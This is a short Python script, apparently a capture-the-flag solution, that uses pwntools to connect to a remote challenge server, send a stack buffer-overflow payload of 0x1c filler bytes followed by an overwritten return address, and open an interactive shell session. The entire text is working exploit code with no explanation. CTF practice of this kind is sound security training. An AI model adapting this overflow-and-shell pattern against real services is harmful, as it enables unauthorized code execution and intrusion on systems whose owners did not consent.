from pwn import *
#sh=process("./timu")
sh=remote("node5.buuoj.cn",29201)
payload=0x1c*b'a'+p32(0x0804851B)
sh.sendline(payload)
sh.interactive()
